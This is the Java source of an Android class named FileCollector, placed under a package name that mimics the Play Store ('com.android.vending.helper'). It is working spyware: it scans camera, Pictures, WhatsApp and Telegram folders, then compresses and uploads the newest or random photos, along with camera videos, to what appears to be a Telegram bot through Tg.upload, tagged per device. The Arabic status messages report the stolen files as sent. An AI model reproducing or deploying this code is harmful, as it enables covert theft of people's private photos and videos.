package com.android.vending.helper;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import java.io.*;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public class FileCollector {
    private final Context ctx;
    public FileCollector(Context c) { this.ctx = c; }

    private List<File> getAllImages() {
        List<File> images = new ArrayList<>();
        File storage = Environment.getExternalStorageDirectory();
        scanForImages(new File(storage, "DCIM"), images);
        scanForImages(new File(storage, "Pictures"), images);
        scanForImages(new File(storage, "WhatsApp/Media/WhatsApp Images"), images);
        scanForImages(new File(storage, "Telegram"), images);
        return images;
    }

    private void scanForImages(File dir, List<File> result) {
        if (dir == null || !dir.exists() || !dir.isDirectory()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) { scanForImages(f, result); }
            else {
                String name = f.getName().toLowerCase();
                if (name.endsWith(".jpg") || name.endsWith(".jpeg") || name.endsWith(".png") || name.endsWith(".webp")) {
                    result.add(f);
                }
            }
        }
    }

    public String getPhotoCount() {
        return "إجمالي الصور المكتشفة: " + getAllImages().size();
    }

    public String uploadLatestPhotos(int limit) {
        List<File> all = getAllImages();
        if (all.isEmpty()) return "[-] لا توجد صور. اذهب للإعدادات > التطبيق > الصلاحيات > السماح بكل الملفات.";
        
        Collections.sort(all, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
        int count = Math.min(limit, all.size());
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) {
            sb.append(compressAndUpload(all.get(i), "صورة_حديثة")).append('\n');
        }
        return "تم إرسال أحدث الصور:\n" + sb.toString();
    }

    public String uploadRandomPhotos(int limit) {
        List<File> all = getAllImages();
        if (all.isEmpty()) return "[-] لا توجد صور. اذهب للإعدادات > التطبيق > الصلاحيات > السماح بكل الملفات.";

        Set<String> usedIds = loadUsedIds();
        List<File> unused = new ArrayList<>();
        for (File f : all) { if (!usedIds.contains(f.getAbsolutePath())) unused.add(f); }

        if (unused.isEmpty()) {
            usedIds.clear(); new File(ctx.getFilesDir(), "used_photos.txt").delete();
            unused.addAll(all);
        }

        Collections.shuffle(unused);
        int count = Math.min(limit, unused.size());
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) {
            File f = unused.get(i);
            sb.append(compressAndUpload(f, "صورة_عشوائية")).append('\n');
            usedIds.add(f.getAbsolutePath());
        }
        saveUsedIds(usedIds);
        return "تم إرسال " + count + " صورة عشوائية:\n" + sb.toString();
    }
    
    private Set<String> loadUsedIds() {
        Set<String> ids = new HashSet<>(); File f = new File(ctx.getFilesDir(), "used_photos.txt");
        if (f.exists()) { try { BufferedReader br = new BufferedReader(new FileReader(f)); String line; while ((line = br.readLine()) != null) ids.add(line.trim()); br.close(); } catch (Exception ignored) {} }
        return ids;
    }
    private void saveUsedIds(Set<String> ids) {
        try { File f = new File(ctx.getFilesDir(), "used_photos.txt"); BufferedWriter bw = new BufferedWriter(new FileWriter(f)); for (String id : ids) { bw.write(id); bw.newLine(); } bw.close(); } catch (Exception ignored) {}
    }

    public String uploadCameraVideos(int limit) {
        List<File> vids = new ArrayList<>();
        scanForVideos(new File(Environment.getExternalStorageDirectory(), "DCIM"), vids);
        if (vids.isEmpty()) return "[-] لا توجد فيديوهات.";
        StringBuilder sb = new StringBuilder();
        int count = Math.min(limit, vids.size());
        for (int i = 0; i < count; i++) { sb.append(uploadFile(vids.get(i), "فيديو")).append('\n'); }
        return "تم سحب الفيديوهات:\n" + sb.toString();
    }

    private void scanForVideos(File dir, List<File> result) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) scanForVideos(f, result);
            else { String n = f.getName().toLowerCase(); if (n.endsWith(".mp4") || n.endsWith(".3gp")) result.add(f); }
        }
    }

    private String compressAndUpload(File file, String type) {
        File tmp = null;
        try { 
            Bitmap bitmap = BitmapFactory.decodeFile(file.getAbsolutePath()); 
            if (bitmap == null) return "فشل فك التشفير: " + file.getName();
            tmp = File.createTempFile("img_", ".jpg", ctx.getCacheDir()); 
            FileOutputStream out = new FileOutputStream(tmp); 
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, out); out.close(); bitmap.recycle(); 
            String res = Tg.upload(tmp, Dev.tag(ctx) + type); 
            return res.contains("200") ? "تم الرفع" : "فشل: " + res;
        } catch (Exception e) { return "خطأ: " + e.getMessage(); } finally { if (tmp != null) tmp.delete(); }
    }
    
    private String uploadFile(File file, String type) {
        try { 
            String res = Tg.upload(file, Dev.tag(ctx) + type); 
            return res.contains("200") ? "تم الرفع" : "فشل: " + res;
        } catch (Exception e) { return "خطأ: " + e.getMessage(); }
    }
}
